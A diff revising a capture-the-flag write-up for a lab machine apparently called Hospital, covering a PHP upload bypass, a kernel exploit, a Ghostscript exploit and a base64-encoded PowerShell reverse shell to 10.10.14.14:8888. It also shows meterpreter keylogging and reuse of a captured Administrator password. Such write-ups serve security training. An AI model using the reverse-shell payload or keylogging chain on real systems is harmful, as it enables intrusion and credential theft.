@@ -24,7 +24,7 @@ created: 2025-10-16
 
 **🧩 Key Concepts:** 
 
-- Two systems behind one IP: the web app on port 8080 runs on a Linux VM, while everything else is the Windows Domain Controller
+- Two systems behind one IP: the web app on port 8080 runs on a Linux container, while everything else is the Windows Domain Controller
 - File upload (`PHP`)
 - Identify uploads directory with `ffuf`
 - Kernel exploit
@@ -34,7 +34,7 @@ created: 2025-10-16
 
 **🛠️ Tools:**  
 
-- `BurpSuite`
+- `Burp Suite`
 - `hashcat`
 - `metasploit`
 
@@ -52,7 +52,6 @@ created: 2025-10-16
 ## 🌐 Port Scan
 
 - **TCP**: 22, 53, 88, 135, 139, 389, 443, 445, ... (29 ports)
-- **UDP**: None
 
 ---
 
@@ -110,7 +109,7 @@ passthru
 curl_exec
 ```
 
-Everything made sense now. One function not on this list is `popen`. We can use that to achieve `RCE`.
+One function not on this list is `popen`. We can use that to achieve `RCE`.
 
 ---
 
@@ -125,7 +124,7 @@ This is the file I made to abuse the `popen` function.
 ![[Pasted image 20251002161241.png]]
 
 >[!note]
->This is a Linux server even though the box is a Windows machine. The web app runs in a Linux VM on the Windows host.
+>This is a Linux server even though the box is a Windows machine. The web app runs in a Linux container on the Windows host.
 
 Let's get a reverse shell. I used this payload from the payload menu of `Penelope`:
 
@@ -162,7 +161,7 @@ if($link === false){
 ?>
 ```
 
-These are database credentials, so I tried them.
+These are database credentials, so I used them.
 
 ```
 MariaDB [(none)]> show databases;
@@ -201,15 +200,9 @@ MariaDB [hospital]> select * from users;
 3 rows in set (0.000 sec)
 ```
 
-The database had password hashes, so I tried to crack them.
+I tried cracking the hashes and only the `admin` user's hash cracked. It was `123456`.
 
-Using `hashid` I found that the `hashcat` mode was 3200. I tried cracking the hashes and only the `admin` user's hash cracked. It was `123456`.
-
-- `admin`:`123456`
-
-Remember we had another web app on port 443 (`HTTPS`). Those credentials didn't work there.
-
-Enumerating more I found that the machine was vulnerable to `CVE-2023-32629`, which is a kernel exploit. [Here](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh) is an exploit. Running the `.sh` file gives us root.
+Enumerating more I found that the machine was vulnerable to `CVE-2023-32629`, which is a kernel exploit. [Here is an exploit](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh). Running the `.sh` file gives us root.
 
 ![[Pasted image 20251002164508.png|600]]
 
@@ -247,7 +240,7 @@ I generated the malicious file and sent a reply to the email with it.
 
 ![[Pasted image 20251002170526.png]]
 
-The exploit has a `--revshell` option but it only works on Unix, so I used this command:
+The exploit has a `--revshell` option but it only works on Unix-like systems, so I used this command:
 
 ```shell
 python CVE_2023_36664_exploit.py -g -p 'cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' -x eps --filename design
@@ -289,7 +282,7 @@ That didn't do anything. I used `Get-Process` and found there are lots of proces
 >[!tip]
 >Pay attention to programs the user might be actively using, like `iexplore` in the case of the output above.
 
-I decided to migrate to a `meterpreter` shell using a `.exe` generated with `msfvenom` since it has more features and is more stable with our `netcat` shell than `web_delivery`.
+I decided to migrate to a `meterpreter` shell using a `.exe` generated with `msfvenom`.
 
 >[!tip]
 >The `Python` and `PowerShell` `meterpreter` payloads don't support keylogging.
@@ -329,7 +322,7 @@ Dumping captured keystrokes...
 AdministratorTh3B3stH0sp1t4l9786!
 ```
 
-It captured something that looks like the Administrator password.
+It captured something that looks like a password.
 
 ```shell
 $ nxc smb 10.10.11.241 -u 'Administrator' -p 'Th3B3stH0sp1t4l9786!'
